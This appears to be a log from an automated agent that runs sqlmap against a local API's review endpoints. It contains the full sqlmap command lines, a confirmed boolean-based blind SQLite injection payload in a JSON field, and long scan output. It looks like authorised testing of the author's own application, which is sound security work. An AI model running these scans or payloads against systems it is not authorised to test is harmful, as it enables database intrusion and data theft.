INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:27:32 /2025-09-26/
INFO - [20:27:34] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Add_a_review_for_a_product_sqlmap' as the output directory
INFO - JSON data found in POST body. Do you want to process it? [Y/n/q] Y
INFO - [20:27:35] [INFO] resuming back-end DBMS 'sqlite'
INFO - [20:27:35] [INFO] testing connection to the target URL
INFO - sqlmap resumed the following injection point(s) from stored session:
INFO - ---
INFO - Parameter: JSON product_id ((custom) POST)
INFO -     Type: boolean-based blind
INFO -     Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
INFO -     Payload: {"product_id": "1 AND CASE WHEN 1362=1362 THEN 1362 ELSE JSON(CHAR(98,121,116,121)) END", "user_id": "1", "review": "test", "rating": "1"}
INFO - ---
INFO - [20:27:36] [INFO] the back-end DBMS is SQLite
INFO - back-end DBMS: SQLite
INFO - [20:27:36] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Add_a_review_for_a_product_sqlmap\localhost'
INFO - [*] ending @ 20:27:36 /2025-09-26/
WARNING - Potential injection detected. Output saved to attack-logs-dynamic\Add_a_review_for_a_product_discovery.log
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/reviews --output-dir 'attack-logs-dynamic\Add_a_review_for_a_product_sqlmap' --batch --level=5 --risk=3 --threads 5 -H 'Content-Type: application/json' --data '{"product_id": "1", "user_id": "1", "review": "test", "rating": "1"}' --dbs
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:27:40 /2025-09-26/
INFO - [20:27:42] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Add_a_review_for_a_product_sqlmap' as the output directory
INFO - JSON data found in POST body. Do you want to process it? [Y/n/q] Y
INFO - [20:27:43] [INFO] resuming back-end DBMS 'sqlite'
INFO - [20:27:43] [INFO] testing connection to the target URL
INFO - sqlmap resumed the following injection point(s) from stored session:
INFO - ---
INFO - Parameter: JSON product_id ((custom) POST)
INFO -     Type: boolean-based blind
INFO -     Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
INFO -     Payload: {"product_id": "1 AND CASE WHEN 1362=1362 THEN 1362 ELSE JSON(CHAR(98,121,116,121)) END", "user_id": "1", "review": "test", "rating": "1"}
INFO - ---
INFO - [20:27:44] [INFO] the back-end DBMS is SQLite
INFO - back-end DBMS: SQLite
INFO - [20:27:44] [WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
INFO - [20:27:44] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Add_a_review_for_a_product_sqlmap\localhost'
INFO - [*] ending @ 20:27:44 /2025-09-26/
WARNING - Could not parse DB names, but sqlmap output saved to attack-logs-dynamic\Add_a_review_for_a_product_dbs.log
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/reviews/test
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:27:48 /2025-09-26/
INFO - [20:27:50] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
INFO - [20:27:50] [INFO] flushing session file
INFO - [20:27:50] [INFO] testing connection to the target URL
INFO - [20:27:50] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
INFO - [20:27:50] [INFO] checking if the target is protected by some kind of WAF/IPS
INFO - [20:27:50] [INFO] testing if the target URL content is stable
INFO - [20:27:51] [INFO] target URL content is stable
INFO - [20:27:51] [INFO] testing if URI parameter '#1*' is dynamic
INFO - [20:27:51] [INFO] URI parameter '#1*' appears to be dynamic
INFO - [20:27:51] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
INFO - [20:27:51] [INFO] testing for SQL injection on URI parameter '#1*'
INFO - [20:27:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:27:51] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:27:51] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:27:51] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
INFO - [20:27:51] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
INFO - [20:27:51] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
INFO - [20:27:51] [INFO] testing 'Generic inline queries'
INFO - [20:27:51] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
INFO - [20:27:51] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
INFO - [20:27:51] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
INFO - [20:27:51] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
INFO - [20:27:52] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
INFO - [20:27:52] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
INFO - [20:27:52] [INFO] testing 'Oracle AND time-based blind'
INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
INFO - [20:27:52] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:27:52] [WARNING] reflective value(s) found and filtering out
INFO - [20:27:52] [WARNING] URI parameter '#1*' does not seem to be injectable
INFO - [20:27:52] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
INFO - [20:27:52] [WARNING] HTTP error codes detected during run:
INFO - 500 (Internal Server Error) - 77 times
INFO - [*] ending @ 20:27:52 /2025-09-26/
INFO - Flushed sqlmap session for http://localhost:5000/reviews/test (log: attack-logs-dynamic\Get_reviews_for_a_product_flush.log)
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/reviews/test --output-dir 'attack-logs-dynamic\Get_reviews_for_a_product_sqlmap' --batch --level=5 --risk=3 --threads 5 --technique BU
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:27:55 /2025-09-26/
INFO - [20:27:57] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_reviews_for_a_product_sqlmap' as the output directory
INFO - [20:27:58] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
INFO - [20:27:58] [INFO] testing connection to the target URL
INFO - [20:27:58] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
INFO - [20:27:58] [INFO] testing if the target URL content is stable
INFO - [20:27:58] [INFO] target URL content is stable
INFO - [20:27:58] [INFO] testing if URI parameter '#1*' is dynamic
INFO - [20:27:58] [INFO] URI parameter '#1*' appears to be dynamic
INFO - [20:27:58] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
INFO - [20:27:58] [INFO] testing for SQL injection on URI parameter '#1*'
INFO - [20:27:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:27:58] [WARNING] reflective value(s) found and filtering out
INFO - [20:27:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:28:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:28:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:28:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:28:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:28:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:28:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:28:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:28:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:28:05] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
INFO - [20:28:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:28:06] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:28:06] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
INFO - [20:28:07] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:28:08] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:28:09] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:28:10] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:28:11] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:28:12] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:28:13] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:28:14] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:28:15] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:28:15] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:28:17] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:28:18] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:28:19] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:28:19] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
INFO - [20:28:19] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
INFO - [20:28:19] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
INFO - [20:28:19] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
INFO - [20:28:19] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
INFO - [20:28:19] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
INFO - [20:28:19] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
INFO - [20:28:19] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
INFO - [20:28:19] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
INFO - [20:28:19] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
INFO - [20:28:19] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
INFO - [20:28:19] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
INFO - [20:28:19] [INFO] URI parameter '#1*' appears to be 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)' injectable
INFO - it looks like the back-end DBMS is 'Microsoft SQL Server/Sybase'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
INFO - [20:28:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
INFO - [20:28:19] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
INFO - [20:28:19] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
INFO - [20:28:20] [INFO] target URL appears to be UNION injectable with 6 columns
INFO - [20:28:20] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql')
INFO - [20:28:20] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
INFO - [20:28:20] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
INFO - [20:28:21] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
INFO - [20:28:21] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
INFO - [20:28:21] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
INFO - [20:28:21] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
INFO - [20:28:22] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
INFO - [20:28:22] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
INFO - [20:28:22] [INFO] checking if the injection point on URI parameter '#1*' is a false positive
INFO - [20:28:22] [WARNING] false positive or unexploitable injection point detected
INFO - [20:28:22] [WARNING] URI parameter '#1*' does not seem to be injectable
INFO - other non-custom parameters found. Do you want to process them too? [Y/n/q] Y
INFO - [20:28:22] [INFO] testing if parameter 'User-Agent' is dynamic
INFO - [20:28:22] [WARNING] parameter 'User-Agent' does not appear to be dynamic
INFO - [20:28:22] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
INFO - [20:28:22] [INFO] testing for SQL injection on parameter 'User-Agent'
INFO - [20:28:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:28:23] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:28:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:28:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:28:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:28:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:28:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:28:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:28:26] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:28:26] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:28:26] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:28:26] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:28:26] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:28:26] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
INFO - [20:28:26] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:28:27] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:28:27] [WARNING] parameter 'User-Agent' does not seem to be injectable
INFO - [20:28:27] [INFO] testing if parameter 'Referer' is dynamic
INFO - [20:28:27] [WARNING] parameter 'Referer' does not appear to be dynamic
INFO - [20:28:27] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
INFO - [20:28:27] [INFO] testing for SQL injection on parameter 'Referer'
INFO - [20:28:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:28:28] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:28:29] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:28:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:28:30] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:28:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:28:30] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:28:30] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:28:31] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:28:31] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:28:31] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:28:31] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:28:31] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:28:31] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:28:31] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:28:32] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:28:33] [WARNING] parameter 'Referer' does not seem to be injectable
INFO - [20:28:33] [INFO] testing if parameter 'Host' is dynamic
INFO - [20:28:33] [WARNING] parameter 'Host' does not appear to be dynamic
INFO - [20:28:33] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
INFO - [20:28:33] [INFO] testing for SQL injection on parameter 'Host'
INFO - [20:28:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:28:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:28:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:28:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:28:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:28:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:28:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:28:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:28:35] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:28:35] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:28:35] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:28:35] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:28:35] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:28:35] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:28:36] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:28:36] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:28:37] [WARNING] parameter 'Host' does not seem to be injectable
INFO - [20:28:37] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
INFO - [20:28:37] [WARNING] HTTP error codes detected during run:
INFO - 500 (Internal Server Error) - 3452 times, 404 (Not Found) - 4 times
INFO - [*] ending @ 20:28:37 /2025-09-26/
WARNING - Potential injection detected. Output saved to attack-logs-dynamic\Get_reviews_for_a_product_discovery.log
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/reviews/test --output-dir 'attack-logs-dynamic\Get_reviews_for_a_product_sqlmap' --batch --level=5 --risk=3 --threads 5 --dbs
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:28:43 /2025-09-26/
INFO - [20:28:45] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_reviews_for_a_product_sqlmap' as the output directory
INFO - [20:28:45] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
INFO - [20:28:45] [INFO] testing connection to the target URL
INFO - [20:28:45] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
INFO - [20:28:45] [INFO] testing if the target URL content is stable
INFO - [20:28:46] [INFO] target URL content is stable
INFO - [20:28:46] [INFO] testing if URI parameter '#1*' is dynamic
INFO - [20:28:46] [INFO] URI parameter '#1*' appears to be dynamic
INFO - [20:28:46] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
INFO - [20:28:46] [INFO] testing for SQL injection on URI parameter '#1*'
INFO - [20:28:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:28:46] [WARNING] reflective value(s) found and filtering out
INFO - [20:28:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:28:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:28:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:28:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:28:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:28:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:28:52] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:28:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:28:52] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:28:53] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
INFO - [20:28:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:28:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:28:54] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
INFO - [20:28:55] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:28:56] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:28:57] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:28:58] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:28:59] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:29:00] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:29:01] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:29:01] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:29:02] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:29:03] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:29:04] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:29:05] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:29:06] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:29:06] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
INFO - [20:29:06] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
INFO - [20:29:06] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
INFO - [20:29:06] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
INFO - [20:29:06] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
INFO - [20:29:06] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
INFO - [20:29:06] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
INFO - [20:29:06] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
INFO - [20:29:06] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
INFO - [20:29:06] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
INFO - [20:29:06] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
INFO - [20:29:06] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
INFO - [20:29:06] [INFO] URI parameter '#1*' appears to be 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)' injectable
INFO - it looks like the back-end DBMS is 'Microsoft SQL Server/Sybase'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
INFO - [20:29:06] [INFO] testing 'Generic inline queries'
INFO - [20:29:06] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
INFO - [20:29:06] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
INFO - [20:29:06] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
INFO - [20:29:07] [INFO] target URL appears to be UNION injectable with 6 columns
INFO - [20:29:07] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql')
INFO - [20:29:07] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
INFO - [20:29:07] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
INFO - [20:29:07] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
INFO - [20:29:07] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
INFO - [20:29:08] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
INFO - [20:29:08] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
INFO - [20:29:08] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
INFO - [20:29:08] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
INFO - [20:29:09] [INFO] checking if the injection point on URI parameter '#1*' is a false positive
INFO - [20:29:09] [WARNING] false positive or unexploitable injection point detected
INFO - [20:29:09] [WARNING] URI parameter '#1*' does not seem to be injectable
INFO - other non-custom parameters found. Do you want to process them too? [Y/n/q] Y
INFO - [20:29:09] [INFO] testing if parameter 'User-Agent' is dynamic
INFO - [20:29:09] [WARNING] parameter 'User-Agent' does not appear to be dynamic
INFO - [20:29:09] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
INFO - [20:29:09] [INFO] testing for SQL injection on parameter 'User-Agent'
INFO - [20:29:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:29:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:29:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:29:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:29:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:29:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:29:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:29:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:29:11] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:29:11] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:29:11] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:29:11] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
